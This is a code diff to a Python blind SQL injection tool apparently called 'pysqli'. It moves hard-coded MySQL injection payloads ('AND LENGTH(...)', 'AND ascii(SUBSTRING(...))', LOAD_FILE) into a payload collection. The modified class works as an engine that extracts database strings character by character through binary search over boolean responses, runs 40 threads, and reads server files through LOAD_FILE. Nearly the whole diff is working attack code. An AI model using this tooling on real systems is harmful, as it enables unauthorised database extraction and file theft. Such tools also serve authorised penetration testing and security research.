@@ -1,6 +1,7 @@
 from multiprocessing.pool import ThreadPool
 
 from pysqli.blind_tester import BlindTester
+from pysqli.payloads import MysqlPayloads
 from pysqli.string_finder import StringFinder
 from pysqli.tools import *
 
@@ -10,31 +11,33 @@ class BlindStringFinder(StringFinder):
     String finder based on the blind technique.
     """
 
-    def __init__(self, tester: BlindTester):
+    def __init__(self, tester: BlindTester, payloads=MysqlPayloads()):
         """
         Create a BlindTester based on a BlindTester
         :param tester: BlindTester
+        :param payloads payloads collection
         """
         self.tester = tester
+        self.payloads = payloads
 
     def search_length(self, sql, a, b):
         if a == b:
             return a
         if b - a == 1:
-            if self.tester.test("AND LENGTH({}) = {}".format(sql, b)):
+            if self.tester.test(self.payloads.and_size_eq.format(sql, b)):
                 return b
             else:
                 return a
         pivot = int((a + b) / 2)
         # print("[*] pivot : {} / {}-{}".format(pivot,a, b))
-        if self.tester.test("AND LENGTH({}) < {}".format(sql, pivot)):
+        if self.tester.test(self.payloads.and_size_lt.format(sql, pivot)):
             return self.search_length(sql, a, pivot)
         else:
             return self.search_length(sql, pivot, b)
 
     def str_length(self, sql):
         i = 1
-        while not self.tester.test("AND LENGTH({}) < {}".format(sql, i)):
+        while not self.tester.test(self.payloads.and_size_lt.format(sql, i)):
             i *= 2
         # print("[*] LENGTH({}) > i".format(sql, i))
         return self.search_length(sql, int(i / 2), i)
@@ -43,13 +46,13 @@ class BlindStringFinder(StringFinder):
         if a == b:
             return a
         if b - a == 1:
-            if self.tester.test("AND ascii(SUBSTRING({}, {},1)) = {}".format(sql, i, b)):
+            if self.tester.test(self.payloads.and_char_at_is.format(sql, i, b)):
                 return b
             else:
                 return a
         pivot = int((a + b) / 2)
         # print("[*] pivot : {} / {}-{}".format(pivot,a, b))
-        if self.tester.test("AND ascii(SUBSTRING({}, {},1)) < {}".format(sql, i, pivot)):
+        if self.tester.test(self.payloads.and_char_at_lt.format(sql, i, pivot)):
             return self.search_char(sql, i, a, pivot)
         else:
             return self.search_char(sql, i, pivot, b)
@@ -67,7 +70,7 @@ class BlindStringFinder(StringFinder):
 
         :return:
         """
-        if self.tester.test("AND LENGTH({})>0".format(sql)):
+        if self.tester.test(self.payloads.and_size_gt.format(sql, 0)):
             length = self.str_length(sql)
             with ThreadPool(40) as pool:
                 def f(i):
@@ -84,5 +87,5 @@ class BlindStringFinder(StringFinder):
         :param filename: name of the file to read
         :return:
         """
-        return self.read_string("(LOAD_FILE({}))".format(encode_str(filename)))
+        return self.read_string(self.payloads.str_file.format(encode_str(filename)))
 
